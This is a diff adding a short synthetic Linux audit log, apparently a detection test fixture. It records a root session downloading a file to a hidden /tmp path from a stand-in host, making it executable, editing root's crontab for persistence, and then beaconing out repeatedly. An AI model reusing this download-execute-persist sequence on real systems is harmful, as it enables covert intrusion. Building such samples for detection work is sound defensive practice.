@@ -1,0 +1,14 @@
+type=SYSCALL msg=audit(1700000000.100:100): success=yes auid=1001 uid=0 euid=0 ses=7 tty=pts0 comm="curl" exe="/usr/bin/curl" key="network_tools"
+type=EXECVE msg=audit(1700000000.100:100): argc=5 a0="curl" a1="-s" a2="-o" a3="/tmp/.cache/.upd" a4="http://198.51.100.77:8443/update"
+type=SYSCALL msg=audit(1700000002.101:101): success=yes auid=1001 uid=0 euid=0 ses=7 tty=pts0 comm="chmod" exe="/usr/bin/chmod" key="cmd_exec"
+type=EXECVE msg=audit(1700000002.101:101): argc=3 a0="chmod" a1="+x" a2="/tmp/.cache/.upd"
+type=SYSCALL msg=audit(1700000003.102:102): success=yes auid=1001 uid=0 euid=0 ses=7 tty=pts0 comm="crontab" exe="/usr/bin/crontab" key="cmd_exec"
+type=EXECVE msg=audit(1700000003.102:102): argc=4 a0="crontab" a1="-u" a2="root" a3="-e"
+type=USER_CHAUTHTOK msg=audit(1700000004.103:103): auid=1001 ses=7 msg='op=crontab-edit acct="root" res=success'
+type=SYSCALL msg=audit(1700003600.200:200): success=yes auid=4294967295 uid=0 euid=0 ses=4294967295 comm=".upd" exe="/tmp/.cache/.upd" key="net_connect"
+type=SOCKADDR msg=audit(1700003600.200:200): saddr=020024E3C633644D00000000
+type=SYSCALL msg=audit(1700007200.201:201): success=yes auid=4294967295 uid=0 euid=0 ses=4294967295 comm=".upd" exe="/tmp/.cache/.upd" key="net_connect"
+type=SOCKADDR msg=audit(1700007200.201:201): saddr=020024E3C633644D00000000
+type=SYSCALL msg=audit(1700000000.300:300): success=yes auid=1002 uid=1002 euid=1002 ses=8 tty=pts1 comm="curl" exe="/usr/bin/curl" key="network_tools"
+type=EXECVE msg=audit(1700000000.300:300): argc=4 a0="curl" a1="-o" a2="/tmp/monitoring-agent.sh" a3="http://203.0.113.44/agent"
+type=EXECVE msg=audit(1700000001.400:400): argc=3 a0="chmod" a1="+x" a2="/tmp/.cache/.upd"
